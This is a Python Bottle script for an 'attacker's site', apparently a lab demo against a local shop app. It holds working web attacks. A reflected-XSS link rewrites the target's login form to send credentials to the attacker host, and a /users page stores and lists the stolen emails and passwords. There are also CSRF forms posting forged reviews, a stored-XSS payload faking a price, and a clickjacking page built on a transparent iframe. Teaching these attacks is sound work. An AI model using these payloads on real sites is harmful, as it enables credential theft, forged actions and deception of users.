from threading import ExceptHookArgs
from bottle import route, run, template, request, redirect, hook
import sqlite3
from datetime import datetime


HOST='evil.localtest.me'
PORT=8081
TARGET_URL='http://localhost:8080'
EVIL_DATABASE_FILE = 'evil.db'

@route('/')
def index():
    if request.headers['HOST'] == 'localhost:' + str(PORT):
        redirect('http://' + HOST + ':' + str(PORT))
    return '''
        <h1>攻撃者が準備したサイト</h1>
        <ul>
            <li><a href="/users">盗んだユーザー情報</a></li>
            <li><a href="/game1">CSRF</a></li>
            <li><a href="/game2">CSRF + Persistent XSS</a></li>
            <li><a href="/game3">Clickjacking</a></li>
        </ul>'''

@route('/users')
def list_users():
    conn = sqlite3.connect(EVIL_DATABASE_FILE)
    cur = conn.cursor()
    users = cur.execute('SELECT * FROM users;').fetchall()
    return template('''
<p>盗んだユーザー情報</p>
<table border="1">
  <tr><th>時刻</th><th>メールアドレス</th><th>パスワード</th></tr>
  %for user in users:
  <tr><td>{{ user[1] }}</td><td>{{ user[2] }}</td><td>{{ user[3] }}</td></tr>
  %end
</table>''', users=users)

@route('/users', method="post")
def add_user():
    email = request.forms.email
    password = request.forms.password
    conn = sqlite3.connect(EVIL_DATABASE_FILE)
    cur = conn.cursor()
    cur.execute('INSERT INTO users (datetime, email, password) VALUES (?, ?, ?)', (datetime.now(), email, password))
    conn.commit()
    redirect(TARGET_URL + '/logout')

@route('/game0')
def show_game0():
    return template('''
<p>楽しいゲームで遊ぶには、<a target="_blank" href="{{ url }}/login?message=<script>window.onload=function(){document.querySelector('form').action='http://{{ host }}:{{ port }}/users'}</script>">ここをクリック</a>してね！</p>
    ''', url=TARGET_URL, host=HOST, port=PORT)

@route('/game1')
def show_game1():
    return template('''
<p>とっても楽しいゲームだよ！</p>
<form action="{{ url }}/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="最高の商品です！本当は★100を付けたいくらい！" />
  <input type="submit" value="遊んでみる" />
</form>''', url=TARGET_URL)

@route('/game2')
def show_game2():
    return template('''
<p>いまだかつてないくらい楽しいゲームだよ！</p>
<form action="{{ url }}/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="本当は★100を付けたいくらい最高の商品なのに、今だけ100円で売ってます！！<script>window.onload=function(){
      var td = document.querySelectorAll('tr td')[7];
      td.innerHTML = '<s>' + td.innerHTML + '</s><b>今だけ100円！！</b>';
  }</script>" />
  <input type="submit" value="遊んでみる" />
</form>''', url=TARGET_URL)

@route('/game3')
def show_game3():
    return template('''
<p>下の方に面白いゲームが遊べるボタンがあるよ！ちゃんと押せるかな？？</p>
<p><input type="checkbox" onchange="invisible(this.checked)">消す</p>
<iframe src="{{ url }}/products" width="800" height="1200"></iframe>
<button style="position:absolute; top:370; left:395; z-index:-1;">あそんでみる</button>
<script>function invisible(checked) {
    const iframe = document.querySelector('iframe');
    if (checked) {
        iframe.style = 'opacity:0.001; filter:alpha(opacity=0.001);';
    } else {
        iframe.style = '';
    }
}</script>''', url=TARGET_URL)

run(host=HOST, port=PORT, reloader=True)
